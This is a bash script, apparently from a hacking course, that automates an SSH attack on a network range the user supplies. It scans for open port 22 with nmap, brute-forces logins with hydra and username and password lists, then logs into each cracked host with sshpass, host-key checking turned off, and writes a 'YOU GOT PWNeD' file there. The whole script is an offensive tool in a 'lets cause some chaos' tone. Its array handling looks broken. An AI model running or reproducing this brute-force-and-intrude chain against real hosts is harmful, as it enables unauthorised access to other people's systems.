#!/bin/bash


# Check if sshpass is installed
if ! [ -x "$(command -v sshpass)" ]; then
    echo "sshpass is not installed. Installing it now..."
    # Install sshpass
    apt-get install sshpass -y
else
    echo "sshpass is already installed. Continuing..."
    echo
fi

##1##. Get from the user IP range || 1.b.* get the user to enter a country name

echo "Hey there hacker, please enter the IP range you want to attack:
Example: 192.168.0.0/24
"
read IP
echo&&echo


##2##. Scan for port22 (ssh).

nmap -p22 $IP --open | grep -w "for" | awk '{print$5}' >/var/tmp/.hostsFound
echo "Hosts with port 22 open:"&& cat /var/tmp/.hostsFound

##3##. BF using weak passwords.
#Hydra saves the results into a file.

echo&&echo
hydra -I -M /var/tmp/.hostsFound -L /home/kali/Desktop/JohnBryce_26_01_2023/two_short_lists/userlist -P /home/kali/Desktop/JohnBryce_26_01_2023/two_short_lists/passlist -t 4 ssh -o /var/tmp/.results.txt

##4##. Once hacked, create a file on the victim's machine with your name.

echo "Enter your name, HACKER, lets cause some chaos:"
read NAME


array=$(cat /var/tmp/.hostsFound)
array2=$(cat /var/tmp/.results.txt | grep  -w  'login' | awk '{gsub(":"," "); print $5}' | sort -u | sed 's/,/\"/g')
array3=$(cat /var/tmp/.results.txt | grep  -w  'login' | awk '{gsub(":"," "); print $7}' | sort -u | sed 's/,/\"/g')

for i in "${!array[@]}"
do
	sshpass -p "${array3[i]}" ssh "${array2[i]}"@"${array[i]}" -o StrictHostKeyChecking=no "echo 'YOU GOT PWNeD' > $NAME.txt"
	##5##. save each breach in your local log: date + IP + username + password.
	echo "$(date)- $(echo "${array2[i]}")"
done







